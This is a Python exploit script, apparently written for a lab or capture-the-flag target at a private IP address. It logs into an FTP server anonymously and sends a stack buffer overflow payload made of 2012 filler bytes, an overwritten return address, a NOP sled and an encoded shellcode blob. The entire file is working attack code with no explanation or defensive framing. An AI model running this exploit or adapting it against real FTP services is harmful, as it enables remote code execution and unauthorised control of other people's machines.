import socket

import sys

USER    = "anonymous"

PASSWD  = "TEST"


buf =  b""                                                                                                       
buf += b"\xbb\xae\xb0\x8b\x43\xd9\xe5\xd9\x74\x24\xf4\x5a\x2b"                                                   
buf += b"\xc9\xb1\x52\x31\x5a\x12\x03\x5a\x12\x83\x6c\xb4\x69"                                                   
buf += b"\xb6\x8c\x5d\xef\x39\x6c\x9e\x90\xb0\x89\xaf\x90\xa7"                                                   
buf += b"\xda\x80\x20\xa3\x8e\x2c\xca\xe1\x3a\xa6\xbe\x2d\x4d"                                                   
buf += b"\x0f\x74\x08\x60\x90\x25\x68\xe3\x12\x34\xbd\xc3\x2b"
buf += b"\xf7\xb0\x02\x6b\xea\x39\x56\x24\x60\xef\x46\x41\x3c"
buf += b"\x2c\xed\x19\xd0\x34\x12\xe9\xd3\x15\x85\x61\x8a\xb5"
buf += b"\x24\xa5\xa6\xff\x3e\xaa\x83\xb6\xb5\x18\x7f\x49\x1f"
buf += b"\x51\x80\xe6\x5e\x5d\x73\xf6\xa7\x5a\x6c\x8d\xd1\x98"
buf += b"\x11\x96\x26\xe2\xcd\x13\xbc\x44\x85\x84\x18\x74\x4a"
buf += b"\x52\xeb\x7a\x27\x10\xb3\x9e\xb6\xf5\xc8\x9b\x33\xf8"
buf += b"\x1e\x2a\x07\xdf\xba\x76\xd3\x7e\x9b\xd2\xb2\x7f\xfb"
buf += b"\xbc\x6b\xda\x70\x50\x7f\x57\xdb\x3d\x4c\x5a\xe3\xbd"
buf += b"\xda\xed\x90\x8f\x45\x46\x3e\xbc\x0e\x40\xb9\xc3\x24"
buf += b"\x34\x55\x3a\xc7\x45\x7c\xf9\x93\x15\x16\x28\x9c\xfd"
buf += b"\xe6\xd5\x49\x51\xb6\x79\x22\x12\x66\x3a\x92\xfa\x6c"
buf += b"\xb5\xcd\x1b\x8f\x1f\x66\xb1\x6a\xc8\x83\x4e\x20\x20"
buf += b"\xfc\x4c\xc8\x34\x2e\xd9\x2e\x5e\xde\x8c\xf9\xf7\x47"
buf += b"\x95\x71\x69\x87\x03\xfc\xa9\x03\xa0\x01\x67\xe4\xcd"
buf += b"\x11\x10\x04\x98\x4b\xb7\x1b\x36\xe3\x5b\x89\xdd\xf3"
buf += b"\x12\xb2\x49\xa4\x73\x04\x80\x20\x6e\x3f\x3a\x56\x73"
buf += b"\xd9\x05\xd2\xa8\x1a\x8b\xdb\x3d\x26\xaf\xcb\xfb\xa7"
buf += b"\xeb\xbf\x53\xfe\xa5\x69\x12\xa8\x07\xc3\xcc\x07\xce"
buf += b"\x83\x89\x6b\xd1\xd5\x95\xa1\xa7\x39\x27\x1c\xfe\x46"
buf += b"\x88\xc8\xf6\x3f\xf4\x68\xf8\xea\xbc\x99\xb3\xb6\x95"
buf += b"\x31\x1a\x23\xa4\x5f\x9d\x9e\xeb\x59\x1e\x2a\x94\x9d"
buf += b"\x3e\x5f\x91\xda\xf8\x8c\xeb\x73\x6d\xb2\x58\x73\xa4"



PAYLOAD = "\x41" * 2012 + "\x0f\x78\xca\x40" + "\x90" * 50 + buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("10.10.184.43",21))

data = s.recv(1024)

s.send("USER " + USER + '\r\n')

data = s.recv(1024)

s.send("PASS " + PASSWD + '\r\n')

data = s.recv(1024)

s.send(PAYLOAD +'\r\n')

s.close()